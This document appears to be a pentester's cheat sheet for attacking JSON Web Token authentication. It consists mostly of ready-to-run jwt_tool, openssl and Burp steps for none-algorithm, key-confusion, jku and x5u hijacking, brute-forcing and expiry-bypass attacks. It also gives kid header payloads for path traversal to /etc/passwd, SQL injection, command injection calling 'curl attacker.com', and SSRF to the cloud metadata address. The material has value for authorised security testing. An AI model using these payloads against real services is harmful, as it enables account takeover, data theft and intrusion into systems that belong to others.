# 1. Basic Tests to Run First
## A. Automatic Testing with jwt_tool

```yaml
# Run all tests
python3 jwt_tool.py -M at \
    -t "https://target.com/api/endpoint" \
    -rh "Authorization: Bearer eyJhbG..."

# Or test manually captured token
python3 jwt_tool.py <JWT_TOKEN> -C
```

## B. Burp Suite Testing
1. Send request to Repeater
2. User "JSON Web Token" extension tab
3. Try "Algorithm none" attack
4. Use **JOSEPH** extension for key confusion
## C. HMAC Brute-Force

```yaml
# Common secrets
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

# 3. Algorithm Attacks
## A. RS256 to HS256 (Key Confusion)

```yaml
# Get server public key
openssl s_client -connect target.com:443 2>&1 | sed -n '/BEGIN/,/END/p' > pub.pem

# Attack
python3 jwt_tool.py <TOKEN> -X k -pk pub.pem
```

## B. Create New Key in Header

```yaml
1. Generate new key pair
2. Embed public key in header
3. Sign with private key
4. Server uses your public key to verify

With jwt_tool: -X e
```

# 4. Header Parameter Attacks
## A. jku (JWK Set URL) Hijacking

```yaml
1. Check if token has "jku": "https://target.com/keys.json"
2. Change to your controlled domain
3. Host malicious JWKS with your public key
4. Server fetches your key → accepts your signature

jwt_tool: -X s
```

## B. kid (Key ID) Attacks

```yaml
1. Path Traversal:
"kid": "../../../../etc/passwd"

2. SQL Injection:
"kid": "1' UNION SELECT 'attacker_key'--"

3. Command Injection:
"kid": "/tmp/exploit.sh; curl attacker.com"

4. SSRF:
"kid": "http://169.254.169.254/latest/meta-data/"
```

## C. x5u / x5c Certificate Attacks

```yaml
# x5u - Certificate URL
Change to your server: "x5u": "https://attacker.com/cert.pem"

# x5c - Embedded Certificate
Replace with your self-signed cert
```

# 5. Payload Attacks
## A. Expiration Bypass

```yaml
{
  "exp": 9999999999,  // Far future
  "iat": 1            // Very old
}
```

## B. No Expiration Check

```yaml
Remove "exp" field entirely
Or set "exp": null
```

## c. jti (JWT ID) Replay

```yaml
If jti length limited to 4 chars:
0001 and 10001 are same ID
Replay older token by counting wraps
```

# 6. Cross-Service Attack
## A. Token Replay Across Services

```yaml
1. Sign up on service A (uses same JWT provider)
2. Get token from service A
3. Try token on target service B
4. If accepted → vulnerable to account spoofing
```

## B. Shared Secret Guess

```yaml
Common shared secrets in microservices:
"microservice-secret"
"shared-secret-key"
"jwt-secret-2023"
```


# 7. Timing & Cryptography Attack

## A. ES256 Nonce Reuse
```yaml
If same nonce used for two ES256 tokens:
Private key can be calculated
Capture two tokens → extract key
```

## B. Weak ECDSA Signatures

```yaml
# Check for weak curves
python3 jwt_tool.py <TOKEN> -V
```

## C. Timestamp Manipulation

```yaml
{
  "nbf": 1,           // Not Before = long ago
  "iat": 1,           // Issued At = long ago  
  "exp": 9999999999   // Expiration = far future
}
```

# 8. Tool Commands Quick Reference
## jwt_tool Common Attacks

```yaml
# Test all attacks
python3 jwt_tool.py <TOKEN> -M at

# Key confusion (RS256→HS256)
python3 jwt_tool.py <TOKEN> -X k -pk public.pem

# JKU spoofing
python3 jwt_tool.py <TOKEN> -X s

# Embedded key (CVE-2018-0114)
python3 jwt_tool.py <TOKEN> -X e

# None algorithm
python3 jwt_tool.py <TOKEN> -X n

# Kid injection
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../etc/passwd"
```

# 9. Quick Testing Workflow

### Step 1: Examine Token

```yaml
python3 jwt_tool.py <TOKEN> -S
# Check for: alg, kid, jku, x5u, x5c
```
### **Step 2: Try Easy Attacks**

1. None algorithm
2. Brute-force simple HMAC secrets
3. Change payload without modifying signature
### **Step 3: Test Header Parameters**

1. If kid exists → test path traversal/SQLi
2. If jku exists → change to your server
3. If x5u exists → change to your cert

### **Step 4: Algorithm Attacks**

1. RS256→HS256 if you have public key
2. Try embedded key attack
3. Check for weak algorithms (HS256, RS256)

### **Step 5: Payload Attacks**

1. Modify expiration
2. Change user/role fields
3. Test token replay

---

# **10. Critical Findings Priority**

1. **No signature verification** (any change works)
    
2. **"None" algorithm accepted**
    
3. **Key confusion** (RS256→HS256)
    
4. **JKU/JWKS spoofing**
    
5. **kid path traversal to known files**
    
6. **Weak HMAC secret** (brute-forced)
    
7. **Expiration not checked**
    
8. **Token replay across services**